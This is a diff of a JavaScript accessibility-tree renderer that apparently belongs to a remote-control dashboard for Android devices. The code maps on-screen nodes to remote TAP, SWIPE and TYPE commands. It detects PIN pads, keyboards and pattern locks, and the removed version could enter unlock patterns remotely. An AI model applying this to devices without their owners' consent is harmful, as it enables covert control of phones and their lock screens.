@@ -1,447 +1,200 @@
-'use strict';
 /**
- * LyReader v3 — Red-wire accessibility tree renderer
+ * ly-reader.js — Alpha Ly accessibility tree renderer.
  *
- * BUG FIX: Android accessibility bounds are ABSOLUTE screen coordinates, not
- * relative to parent. Old v2 nesting caused every child to be offset by its
- * parent's accumulated position. Fix: flat rendering — all nodes appended
- * directly to phone div with left = bounds.x * scale, top = bounds.y * scale.
- * Z-ordering is correct because tree walk is depth-first (children later in DOM).
- *
- * AESTHETIC: dark background, red wireframe lines, red text, monospace font.
+ * Renders the device accessibility tree as a flat SVG wireframe.
+ * Colour codes by node type. Click any node → TAP command to that node's centre.
+ * Shows FLAG_SECURE badge, keyboard highlight, PIN/pattern detection.
  */
+'use strict';
 
-class LyReader {
-  constructor(container, deviceId, sendFn, screenW = 1080, screenH = 1920) {
-    this._container = container;
-    this._deviceId  = deviceId;
-    this._send      = sendFn;
-    this._screenW   = screenW;
-    this._screenH   = screenH;
-    this._root         = null;
-    this._nodes        = [];
-    this._focused      = null;
-    this._refreshTimer = null;
-    this._pollTimer    = null;
-    this._polling      = false;
-    this._scale        = 1;
-    this._ox           = 0;
-    this._oy           = 0;
-    this._phone        = null;
-    this._build();
+class AlphaLy {
+
+  static COLORS = {
+    default:     '#00e5ff22',
+    border:      '#00e5ff',
+    text:        '#00e5ff',
+    editable:    '#ff9100',
+    keyboard:    '#00ff9d',
+    keyboardKey: '#00ff9d55',
+    pinDigit:    '#ff4081',
+    pattern:     '#ea00ff',
+    swipe:       '#ffe000',
+    focused:     '#fff',
+    secure:      '#ff1e3c',
+  };
+
+  constructor(svgEl, ws, devId) {
+    this.svg    = svgEl;
+    this.ws     = ws;
+    this.devId  = devId;
+    this.active = false;
+
+    this._pollTimer  = null;
+    this._secureFlag = false;
+    this._lastHash   = '';
+    this._deviceW    = 1;
+    this._deviceH    = 1;
   }
 
-  _build() {
-    this._container.style.cssText = `position:relative;width:100%;height:100%;overflow:hidden;background:#040406;font-family:'Courier New',monospace;cursor:default;user-select:none;`;
+  // ── Start/stop polling ────────────────────────────────────────────────────────
 
-    this._placeholder = document.createElement('div');
-    this._placeholder.style.cssText = `position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;pointer-events:none;`;
-    this._placeholder.innerHTML = `
-      <div style="font-size:28px;margin-bottom:12px;filter:drop-shadow(0 0 10px #880000)">📱</div>
-      <div style="color:#550000;letter-spacing:3px;font-size:11px;font-weight:700">LY READER</div>
-      <div style="font-size:9px;margin-top:8px;color:#2a0000;letter-spacing:1px">PRESS START — AWAITING HIERARCHY</div>`;
-    this._container.appendChild(this._placeholder);
-
-    this._statusBar = document.createElement('div');
-    this._statusBar.style.cssText = `position:absolute;top:0;left:0;right:0;height:18px;background:rgba(4,0,0,0.92);border-bottom:1px solid #2a0000;display:flex;align-items:center;padding:0 8px;gap:8px;font-size:9px;z-index:9999;pointer-events:none;`;
-    this._statusBar.innerHTML = `<span style="color:#cc0000;letter-spacing:2px;font-weight:700">LY</span><span id="_lyr_pkg" style="color:#880000"></span><span style="flex:1"></span><span id="_lyr_cnt" style="color:#440000">0 nodes</span><span id="_lyr_dim" style="color:#220000;margin-left:6px"></span>`;
-    this._container.appendChild(this._statusBar);
-
-    this._layer = document.createElement('div');
-    this._layer.style.cssText = 'position:absolute;inset:0;overflow:hidden;';
-    this._container.appendChild(this._layer);
-
-    this._realInput = document.createElement('input');
-    this._realInput.type = 'text';
-    this._realInput.autocomplete = 'off';
-    this._realInput.spellcheck = false;
-    this._realInput.style.cssText = `position:absolute;left:-9999px;top:0;width:1px;height:1px;opacity:0;pointer-events:none;font-size:16px;`;
-    this._container.appendChild(this._realInput);
-    this._bindRealInput();
-    this._container.tabIndex = 0;
-    this._container.addEventListener('keydown', e => this._onKeydown(e));
-    // Re-focus the hidden input on any click in the container so mobile keyboard
-    // stays open and input events keep routing correctly
-    this._container.addEventListener('click', () => {
-      if (this._focused) {
-        try { this._realInput.focus({ preventScroll: true }); } catch {}
-      }
-    });
+  start(intervalMs = 700) {
+    this.active = true;
+    this.ws.send({ type: 'hierarchy_subscribe', devId: this.devId, interval: intervalMs });
   }
 
-  update(data) {
-    if (typeof data === 'string') { try { data = JSON.parse(data); } catch { return; } }
-    const hier = data?.hierarchy || data;
-    if (!hier) return;
-    this._root = hier;
-    const rb = hier.bounds || {};
-    if (rb.w > 0) this._screenW = rb.w;
-    if (rb.h > 0) this._screenH = rb.h;
-    this._placeholder.style.display = 'none';
-    this._render(hier);
-    this._updateStatus(hier);
+  stop() {
+    this.active = false;
+    this.ws.send({ type: 'hierarchy_unsubscribe', devId: this.devId });
+    this._clear();
   }
 
-  startPolling(ms = 700) {
-    if (this._polling) return;
-    this._polling = true;
-    this._requestHierarchy();
-    this._pollTimer = setInterval(() => { if (this._polling) this._requestHierarchy(); }, ms);
+  // ── Hierarchy receiver (called by dash.js) ────────────────────────────────────
+
+  onHierarchy({ id, data }) {
+    if (id !== this.devId || !this.active) return;
+    let root;
+    try { root = typeof data === 'string' ? JSON.parse(data) : data; }
+    catch { return; }
+
+    // Skip re-render if nothing changed (simple hash)
+    const hash = data.substring ? data.substring(0, 200) : JSON.stringify(root).substring(0, 200);
+    if (hash === this._lastHash) return;
+    this._lastHash = hash;
+
+    this._deviceW    = root.w    || 1080;
+    this._deviceH    = root.h    || 1920;
+    this._secureFlag = root.secure || false;
+
+    this._render(root);
   }
 
-  stopPolling() {
-    if (!this._polling) return;
-    this._polling = false;
-    clearInterval(this._pollTimer);
-    this._pollTimer = null;
-    clearTimeout(this._refreshTimer);
+  onSecureWindow(secure) {
+    this._secureFlag = secure;
   }
 
-  destroy() { this.stopPolling(); clearTimeout(this._refreshTimer); this._container.innerHTML = ''; }
-  onResize() { if (this._root) this._render(this._root); }
+  // ── Render ────────────────────────────────────────────────────────────────────
 
   _render(root) {
-    const cw = this._container.clientWidth  || 360;
-    const ch = this._container.clientHeight || 720;
-    const sw = this._screenW  || 1080;
-    const sh = this._screenH  || 1920;
-    const scale = Math.min(cw / sw, ch / sh);
-    const ox    = Math.round((cw - sw * scale) / 2);
-    const oy    = Math.round((ch - sh * scale) / 2);
-    this._scale = scale; this._ox = ox; this._oy = oy;
-    this._layer.innerHTML = '';
-    this._nodes = []; this._focused = null;
+    const svgW = this.svg.clientWidth  || 360;
+    const svgH = this.svg.clientHeight || 640;
 
-    const phone = document.createElement('div');
-    phone.style.cssText = `position:absolute;left:${ox}px;top:${oy}px;width:${Math.round(sw*scale)}px;height:${Math.round(sh*scale)}px;background:#050505;border:1px solid #3a0000;`;
-    this._layer.appendChild(phone);
-    this._phone = phone;
+    const scaleX = svgW / this._deviceW;
+    const scaleY = svgH / this._deviceH;
 
-    const scanline = document.createElement('div');
-    scanline.style.cssText = `position:absolute;inset:0;pointer-events:none;z-index:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(80,0,0,0.04) 2px,rgba(80,0,0,0.04) 4px);`;
-    phone.appendChild(scanline);
+    this.svg.setAttribute('viewBox', `0 0 ${svgW} ${svgH}`);
+    this._clear();
 
-    this._walkFlat(root, phone, scale, sw, sh);
+    if (this._secureFlag) {
+      this._appendSecureBadge(svgW);
+    }
 
-    const dim = this._container.querySelector('#_lyr_dim');
-    if (dim) dim.textContent = `${sw}×${sh}`;
+    this._walkNodes(root.children || [], scaleX, scaleY);
   }
 
-  /* Flat walk: ALL nodes appended to phone. bounds.x/y = absolute device coords */
-  _walkFlat(node, phone, scale, sw, sh) {
-    if (!node) return;
+  _walkNodes(nodes, sx, sy) {
+    for (const node of nodes) {
+      this._renderNode(node, sx, sy);
+      if (node.children) this._walkNodes(node.children, sx, sy);
+    }
+  }
+
+  _renderNode(node, sx, sy) {
     const b = node.bounds;
-    if (b && b.w > 0 && b.h > 0 && b.x + b.w > 0 && b.y + b.h > 0 && b.x < sw && b.y < sh) {
-      const el = this._buildEl(node, b, scale, sw, sh);
-      if (el) { el.style.zIndex = '1'; phone.appendChild(el); }
-    }
-    for (const c of (node.children || [])) this._walkFlat(c, phone, scale, sw, sh);
-  }
+    if (!b || b.w <= 0 || b.h <= 0) return;
 
-  _buildEl(node, b, scale, sw, sh) {
-    if (node.isPatternLock && node.patternGrid) return this._buildPatternLock(node, b, scale, sw, sh);
-    if (node.isSwipeUnlock && node.swipeHint)   return this._buildSwipeUnlock(node, b, scale, sw, sh);
-    if (node.isKeyboardKey || node.isKeyboard)   return this._buildKeyboardKey(node, b, scale, sw, sh);
+    const x = b.x * sx, y = b.y * sy;
+    const w = b.w * sx, h = b.h * sy;
 
-    const cls        = (node.class || '').toLowerCase();
-    const text       = node.text || node.desc || node.hint || '';
-    const isEditable  = !!node.editable;
-    const isClickable = !!(node.clickable && !isEditable);
-    const isPinDigit  = !!node.isPinDigit;
-    const enabled     = node.enabled !== false;
+    // Pick colour
+    let fill   = AlphaLy.COLORS.default;
+    let stroke = AlphaLy.COLORS.border;
 
-    const lx = Math.round(b.x * scale);
-    const ly = Math.round(b.y * scale);
-    const lw = Math.max(1, Math.round(b.w * scale));
-    const lh = Math.max(1, Math.round(b.h * scale));
-    const fs = Math.max(7, Math.min(13, lh * 0.44));
+    if (node.isPatternLock) stroke = fill = AlphaLy.COLORS.pattern;
+    else if (node.isPinDigit)   stroke = fill = AlphaLy.COLORS.pinDigit;
+    else if (node.isKeyboardKey) { stroke = AlphaLy.COLORS.keyboard; fill = AlphaLy.COLORS.keyboardKey; }
+    else if (node.isKeyboard)   stroke = AlphaLy.COLORS.keyboard;
+    else if (node.isSwipeUnlock) stroke = fill = AlphaLy.COLORS.swipe;
+    else if (node.editable)     stroke = AlphaLy.COLORS.editable;
+    else if (node.focused)      stroke = AlphaLy.COLORS.focused;
 
-    const div = document.createElement('div');
-    div.style.cssText = `position:absolute;left:${lx}px;top:${ly}px;width:${lw}px;height:${lh}px;box-sizing:border-box;overflow:hidden;`;
+    // Rectangle
+    const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+    rect.setAttribute('x',      x.toFixed(1));
+    rect.setAttribute('y',      y.toFixed(1));
+    rect.setAttribute('width',  w.toFixed(1));
+    rect.setAttribute('height', h.toFixed(1));
+    rect.setAttribute('fill',   fill);
+    rect.setAttribute('stroke', stroke);
+    rect.setAttribute('stroke-width', '1');
+    rect.setAttribute('rx', '2');
 
-    if (isEditable) {
-      div.style.border        = node.focused ? '1.5px solid #ff5555' : '1px solid #bb2222';
-      div.style.background    = 'rgba(8,0,0,0.9)';
-      div.style.borderRadius  = '2px';
-      div.style.cursor        = 'text';
-      div.style.display       = 'flex';
-      div.style.alignItems    = 'center';
-      div.style.padding       = '0 3px';
-      const inner = document.createElement('div');
-      inner.style.cssText = `width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:${fs}px;color:${text ? '#dd6666' : '#441111'};`;
-      let disp = text;
-      if (node.focused && !text) disp = '█';
-      if (node.password && text)  disp = '●'.repeat(Math.min(text.length, 24));
-      inner.textContent = disp;
-      div.appendChild(inner);
-      div.addEventListener('click', e => { e.stopPropagation(); this._tapNode(node, sw, sh); this._setFocused(node, div, inner); });
-      this._nodes.push({ node, el: div, inner });
-
-    } else if (isPinDigit) {
-      div.style.cssText += `background:rgba(15,0,0,0.9);border:1px solid #882222;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#cc4444;font-size:${Math.max(9,lh*0.5)}px;font-weight:700;`;
-      div.textContent = text;
-      this._addTapBehavior(div, node, sw, sh);
-
-    } else if (isClickable) {
-      const prim = cls.includes('button') || cls.includes('btn');
-      if (text) {
-        div.style.border       = `1px solid ${prim ? '#cc2222' : '#660000'}`;
-        div.style.background   = prim ? 'rgba(50,0,0,0.3)' : 'transparent';
-        div.style.borderRadius = '2px';
-        div.style.display      = 'flex';
-        div.style.alignItems   = 'center';
-        div.style.justifyContent = 'center';
-        div.style.cursor       = enabled ? 'pointer' : 'default';
-        div.style.opacity      = enabled ? '1' : '0.4';
-        const lbl = document.createElement('div');
-        lbl.style.cssText = `font-size:${fs}px;color:${prim?'#ee5555':'#aa3333'};overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding:0 2px;text-align:center;`;
-        lbl.textContent = text;
-        div.appendChild(lbl);
-      } else {
-        div.style.background = 'transparent';
-        div.style.cursor     = enabled ? 'pointer' : 'default';
-      }
-      if (enabled) this._addTapBehavior(div, node, sw, sh);
-
-    } else if (text) {
-      div.style.display   = 'flex';
-      div.style.alignItems = 'center';
-      div.style.overflow  = 'hidden';
-      div.style.padding   = '0 2px';
-      const lbl = document.createElement('div');
-      lbl.style.cssText = `font-size:${fs}px;color:#884444;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;`;
-      lbl.textContent = text;
-      div.appendChild(lbl);
-
-    } else {
-      const minSide = Math.round(60 * scale);
-      if (lw < minSide && lh < minSide) return null;
-      div.style.border     = '1px solid rgba(100,0,0,0.18)';
-      div.style.background = 'transparent';
+    if (node.clickable || node.editable || node.scrollable) {
+      rect.style.cursor = 'pointer';
+      const nx = (b.x + b.w / 2) / this._deviceW;
+      const ny = (b.y + b.h / 2) / this._deviceH;
+      rect.addEventListener('click', (e) => {
+        e.stopPropagation();
+        this.ws.cmd(this.devId, 'TAP', { x: nx, y: ny });
+        // Flash clicked node
+        rect.setAttribute('fill', '#ffffff44');
+        setTimeout(() => rect.setAttribute('fill', fill), 200);
+      });
+      rect.addEventListener('dblclick', (e) => {
+        e.stopPropagation();
+        this.ws.cmd(this.devId, 'DOUBLE_TAP', { x: nx, y: ny });
+      });
     }
 
-    if (node.scrollable) this._addScrollBehavior(div, node, sw, sh);
-    if (node.checked)    div.style.outline = '1px solid rgba(60,180,60,0.4)';
-    if (node.focused && !isEditable) div.style.outline = '1.5px solid rgba(255,80,80,0.5)';
-    return div;
-  }
+    this.svg.appendChild(rect);
 
-  _buildKeyboardKey(node, b, scale, sw, sh) {
-    const lx = Math.round(b.x * scale), ly = Math.round(b.y * scale);
-    const lw = Math.max(1, Math.round(b.w * scale)), lh = Math.max(1, Math.round(b.h * scale));
-    const fs = Math.max(7, Math.min(13, lh * 0.52));
-    const label = node.text || node.desc || '';
-
-    // Classify key action — single printable chars use TYPE, special keys TAP
-    const isSingleChar = label.length === 1 && label.trim().length === 1;
-    const specialTypeMap = {
-      '⌫': '\b', 'del': '\b', 'delete': '\b', 'backspace': '\b',
-      '↵': '\n', 'enter': '\n', 'return': '\n', '⏎': '\n',
-      ' ': ' ', 'space': ' ',
-    };
-    const specialText = specialTypeMap[label.toLowerCase()] ?? specialTypeMap[label] ?? null;
-    const useType = isSingleChar || specialText !== null;
-
-    const div = document.createElement('div');
-    div.style.cssText = `position:absolute;left:${lx}px;top:${ly}px;width:${lw}px;height:${lh}px;background:rgba(16,0,0,0.8);border:1px solid #661111;border-radius:${Math.max(1,Math.round(lw*0.1))}px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-sizing:border-box;overflow:hidden;z-index:1;touch-action:manipulation;`;
-    if (label) {
-      const lbl = document.createElement('div');
-      lbl.style.cssText = `font-size:${fs}px;color:#aa3333;font-weight:500;text-align:center;pointer-events:none;overflow:hidden;`;
-      lbl.textContent = label.length <= 3 ? label : label.slice(0, 3);
-      div.appendChild(lbl);
+    // Label
+    const label = this._nodeLabel(node);
+    if (label && w > 20 && h > 10) {
+      const textEl = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+      textEl.setAttribute('x', (x + 3).toFixed(1));
+      textEl.setAttribute('y', (y + Math.min(h - 3, 12)).toFixed(1));
+      textEl.setAttribute('font-size', Math.min(10, h * 0.6).toFixed(1));
+      textEl.setAttribute('fill', AlphaLy.COLORS.text);
+      textEl.setAttribute('font-family', 'monospace');
+      textEl.setAttribute('pointer-events', 'none');
+      textEl.textContent = label.length > 24 ? label.substring(0, 22) + '…' : label;
+      this.svg.appendChild(textEl);
     }
-
-    const press = () => { div.style.background = 'rgba(60,0,0,0.9)'; div.style.borderColor = '#ff4444'; };
-    const release = (fired) => {
-      div.style.background = 'rgba(16,0,0,0.8)';
-      div.style.borderColor = '#661111';
-      if (!fired) return;
-      if (useType) {
-        const txt = specialText !== null ? specialText : label;
-        this._send({ type: 'cmd', target: this._deviceId, cmd: 'TYPE', args: { text: txt } });
-        // Update focused field display
-        if (this._focused) {
-          const cur = this._focused.inner.textContent.replace('█', '');
-          if (txt === '\b') {
-            this._focused.inner.textContent = cur.length > 0 ? cur.slice(0, -1) : '█';
-          } else {
-            this._focused.inner.textContent = cur + (txt === '\n' ? '' : txt);
-          }
-        }
-      } else {
-        this._tapNode(node, sw, sh);
-      }
-      this._scheduleRefresh(400);
-    };
-
-    // Use pointer events — work for both mouse and touch, no split between mouseup/mouseleave
-    let pointerDown = false;
-    div.addEventListener('pointerdown', e => { e.preventDefault(); pointerDown = true; press(); }, { passive: false });
-    div.addEventListener('pointerup',   e => { e.preventDefault(); const f = pointerDown; pointerDown = false; release(f); }, { passive: false });
-    div.addEventListener('pointerleave',() => { pointerDown = false; div.style.background = 'rgba(16,0,0,0.8)'; div.style.borderColor = '#661111'; });
-    div.addEventListener('pointercancel', () => { pointerDown = false; div.style.background = 'rgba(16,0,0,0.8)'; div.style.borderColor = '#661111'; });
-    return div;
   }
 
-  _buildPatternLock(node, b, scale, sw, sh) {
-    const lx = Math.round(b.x * scale), ly = Math.round(b.y * scale);
-    const lw = Math.max(1, Math.round(b.w * scale)), lh = Math.max(1, Math.round(b.h * scale));
-    const div = document.createElement('div');
-    div.style.cssText = `position:absolute;left:${lx}px;top:${ly}px;width:${lw}px;height:${lh}px;cursor:crosshair;z-index:1;`;
-    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-    svg.setAttribute('width', lw); svg.setAttribute('height', lh);
-    svg.style.cssText = 'position:absolute;inset:0;overflow:visible;';
-    const grid = node.patternGrid || [], dotEls = [];
-    for (const pt of grid) {
-      const cx = (pt.x - b.x) * scale, cy = (pt.y - b.y) * scale, r = Math.max(4, (pt.r||20)*scale);
-      const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
-      circle.setAttribute('cx', cx); circle.setAttribute('cy', cy); circle.setAttribute('r', r);
-      circle.setAttribute('fill', 'rgba(60,0,0,0.4)'); circle.setAttribute('stroke', '#882222'); circle.setAttribute('stroke-width', '1');
-      svg.appendChild(circle); dotEls.push({ el: circle, px: pt.x, py: pt.y, cx, cy });
+  _nodeLabel(node) {
+    if (node.text)  return node.text;
+    if (node.desc)  return node.desc;
+    if (node.hint)  return `[${node.hint}]`;
+    if (node.class) {
+      const cls = node.class;
+      if (cls.length < 20) return cls;
+      return cls.split('.').pop();
     }
-    const pathEl = document.createElementNS('http://www.w3.org/2000/svg', 'polyline');
-    pathEl.setAttribute('fill', 'none'); pathEl.setAttribute('stroke', '#ff3333');
-    pathEl.setAttribute('stroke-width', '2'); pathEl.setAttribute('stroke-linecap', 'round');
-    svg.appendChild(pathEl); div.appendChild(svg);
-    let dragging = false, patternPath = [];
-    const hitTest = (ex, ey) => {
-      const rect = div.getBoundingClientRect(), lx2 = ex-rect.left, ly2 = ey-rect.top;
-      for (const d of dotEls) if (Math.hypot(lx2-d.cx,ly2-d.cy)<24 && !patternPath.find(p=>p.x===d.px&&p.y===d.py)) return d;
-      return null;
-    };
-    div.addEventListener('mousedown', e => {
-      dragging = true; patternPath = []; pathEl.setAttribute('points','');
-      dotEls.forEach(d=>{d.el.setAttribute('fill','rgba(60,0,0,0.4)');d.el.setAttribute('stroke','#882222');});
-      const hit = hitTest(e.clientX, e.clientY);
-      if (hit) { patternPath.push({x:hit.px,y:hit.py}); hit.el.setAttribute('fill','rgba(180,0,0,0.5)'); hit.el.setAttribute('stroke','#ff3333'); }
-      e.preventDefault();
-    });
-    window.addEventListener('mousemove', e => {
-      if (!dragging) return;
-      const hit = hitTest(e.clientX, e.clientY);
-      if (hit) {
-        patternPath.push({x:hit.px,y:hit.py}); hit.el.setAttribute('fill','rgba(180,0,0,0.5)'); hit.el.setAttribute('stroke','#ff3333');
-        pathEl.setAttribute('points', patternPath.map(p=>{const d=dotEls.find(dd=>dd.px===p.x&&dd.py===p.y);return d?`${d.cx},${d.cy}`:''}).join(' '));
-      }
-    });
-    window.addEventListener('mouseup', () => {
-      if (!dragging) return; dragging = false;
-      if (patternPath.length >= 2) {
-        for (let i=0;i<patternPath.length-1;i++) {
-          const p1=patternPath[i],p2=patternPath[i+1];
-          setTimeout(()=>{this._send({type:'cmd',target:this._deviceId,cmd:'SWIPE',args:{x1:p1.x/sw,y1:p1.y/sh,x2:p2.x/sw,y2:p2.y/sh,duration:100}});},i*120);
-        }
-        this._scheduleRefresh(600+patternPath.length*120);
-      }
-    });
-    return div;
+    return '';
   }
 
-  _buildSwipeUnlock(node, b, scale, sw, sh) {
-    const lx=Math.round(b.x*scale),ly=Math.round(b.y*scale),lw=Math.max(1,Math.round(b.w*scale)),lh=Math.max(1,Math.round(b.h*scale));
-    const div = document.createElement('div');
-    div.style.cssText = `position:absolute;left:${lx}px;top:${ly}px;width:${lw}px;height:${lh}px;background:rgba(20,0,0,0.3);border:1px dashed #441111;display:flex;align-items:center;justify-content:center;cursor:ns-resize;z-index:1;`;
-    const lbl = document.createElement('div');
-    lbl.style.cssText = 'font-size:9px;color:#663333;pointer-events:none;letter-spacing:1px;';
-    lbl.textContent = '↑ SWIPE TO UNLOCK'; div.appendChild(lbl);
-    div.addEventListener('click',()=>{const h=node.swipeHint;this._send({type:'cmd',target:this._deviceId,cmd:'SWIPE',args:{x1:h.sx/sw,y1:h.sy/sh,x2:h.ex/sw,y2:h.ey/sh,duration:300}});this._scheduleRefresh(500);});
-    return div;
+  _appendSecureBadge(svgW) {
+    const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+    rect.setAttribute('x', '0'); rect.setAttribute('y', '0');
+    rect.setAttribute('width', svgW); rect.setAttribute('height', '22');
+    rect.setAttribute('fill', AlphaLy.COLORS.secure);
+    this.svg.appendChild(rect);
+
+    const txt = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+    txt.setAttribute('x', '8'); txt.setAttribute('y', '15');
+    txt.setAttribute('fill', '#fff');
+    txt.setAttribute('font-size', '12');
+    txt.setAttribute('font-family', 'monospace');
+    txt.setAttribute('font-weight', 'bold');
+    txt.textContent = '⚠ SECURE FLAG — accessibility tree may be incomplete';
+    this.svg.appendChild(txt);
   }
 
-  _addTapBehavior(div, node, sw, sh) {
-    let _pd = false;
-    div.style.touchAction = 'manipulation';
-    div.addEventListener('pointerdown',  e=>{e.preventDefault();_pd=true;div.style.filter='brightness(1.7)';},{passive:false});
-    div.addEventListener('pointerup',    e=>{e.preventDefault();const f=_pd;_pd=false;div.style.filter='';if(f)this._tapNode(node,sw,sh);},{passive:false});
-    div.addEventListener('pointerleave', ()=>{_pd=false;div.style.filter='';});
-    div.addEventListener('pointercancel',()=>{_pd=false;div.style.filter='';});
-  }
-
-  _addScrollBehavior(div, node, sw, sh) {
-    div.addEventListener('wheel', e=>{
-      e.stopPropagation();
-      const bc=node.bounds,cx=(bc.x+bc.w/2)/sw,cy=(bc.y+bc.h/2)/sh,delta=e.deltaY>0?0.25:-0.25;
-      this._send({type:'cmd',target:this._deviceId,cmd:'SWIPE',args:{x1:cx,y1:cy,x2:cx,y2:Math.max(0.01,Math.min(0.99,cy-delta)),duration:250}});
-      this._scheduleRefresh(400);
-    },{passive:true});
-  }
-
-  _tapNode(node, sw, sh) {
-    const bc=node.bounds,cx=Math.max(0,Math.min(1,(bc.x+bc.w/2)/sw)),cy=Math.max(0,Math.min(1,(bc.y+bc.h/2)/sh));
-    this._send({type:'cmd',target:this._deviceId,cmd:'TAP',args:{x:cx,y:cy}});
-    this._scheduleRefresh(400);
-  }
-
-  _setFocused(node, divEl, innerEl) {
-    if (this._focused && this._focused.el !== divEl) this._focused.el.style.border = '1px solid #bb2222';
-    this._focused = {node, el:divEl, inner:innerEl};
-    divEl.style.border = '1.5px solid #ff5555';
-    this._realInput.value = '';
-    // Small delay so the tap completes before we steal focus
-    setTimeout(() => { try { this._realInput.focus(); } catch {} }, 80);
-    this._scheduleRefresh(500);
-  }
-
-  _bindRealInput() {
-    let _composing = false;
-    this._realInput.addEventListener('compositionstart', () => { _composing = true; });
-    this._realInput.addEventListener('compositionend',   () => {
-      _composing = false;
-      const val = this._realInput.value;
-      if (!val) return;
-      this._realInput.value = '';
-      this._dispatchType(val);
-    });
-    this._realInput.addEventListener('input', () => {
-      if (_composing) return; // wait for compositionend
-      const val = this._realInput.value;
-      if (!val) return;
-      this._realInput.value = '';
-      this._dispatchType(val);
-    });
-    this._realInput.addEventListener('keydown', e => {
-      if (e.key === 'Backspace') {
-        e.preventDefault();
-        if (this._focused) {
-          const c = this._focused.inner.textContent.replace('█','');
-          this._focused.inner.textContent = c.length > 0 ? c.slice(0, -1) : '█';
-        }
-        this._send({ type:'cmd', target:this._deviceId, cmd:'TYPE', args:{ text:'\b' } });
-        this._scheduleRefresh(500);
-      }
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        this._send({ type:'cmd', target:this._deviceId, cmd:'TYPE', args:{ text:'\n' } });
-        this._scheduleRefresh(500);
-      }
-    });
-  }
-
-  _dispatchType(val) {
-    if (this._focused) {
-      const cur = this._focused.inner.textContent.replace('█', '');
-      this._focused.inner.textContent = cur + val;
-      this._focused.inner.style.color = '#dd6666';
-    }
-    this._send({ type:'cmd', target:this._deviceId, cmd:'TYPE', args:{ text: val } });
-    this._scheduleRefresh(600);
-  }
-
-  _onKeydown(e) {
-    if(e.ctrlKey||e.metaKey||e.altKey) return;
-    if(this._focused) return; // focused node uses _bindRealInput path
-    if(e.key==='Backspace'){e.preventDefault();this._send({type:'cmd',target:this._deviceId,cmd:'TYPE',args:{text:'\b'}});this._scheduleRefresh(500);return;}
-    if(e.key==='Enter'){e.preventDefault();this._send({type:'cmd',target:this._deviceId,cmd:'TYPE',args:{text:'\n'}});this._scheduleRefresh(500);return;}
-    if(e.key.length===1){this._send({type:'cmd',target:this._deviceId,cmd:'TYPE',args:{text:e.key}});this._scheduleRefresh(500);}
-  }
-
-  _scheduleRefresh(ms=400){clearTimeout(this._refreshTimer);this._refreshTimer=setTimeout(()=>this._requestHierarchy(),ms);}
-  _requestHierarchy(){this._send({type:'cmd',target:this._deviceId,cmd:'REQUEST_HIERARCHY',args:{},silent:true});}
-
-  _updateStatus(root){
-    let n=0; const count=nd=>{if(!nd)return;n++;(nd.children||[]).forEach(count);}; count(root);
-    let pkg=''; const fp=nd=>{if(nd?.id?.includes(':id/'))pkg=nd.id.split(':id/')[0];(nd?.children||[]).forEach(fp);}; fp(root);
-    const pkgEl=this._container.querySelector('#_lyr_pkg'),cntEl=this._container.querySelector('#_lyr_cnt');
-    if(pkgEl)pkgEl.textContent=pkg?pkg.split('.').pop():''; if(cntEl)cntEl.textContent=`${n} nodes`;
+  _clear() {
+    while (this.svg.firstChild) this.svg.removeChild(this.svg.firstChild);
   }
 }
+
+window.AlphaLy = AlphaLy;
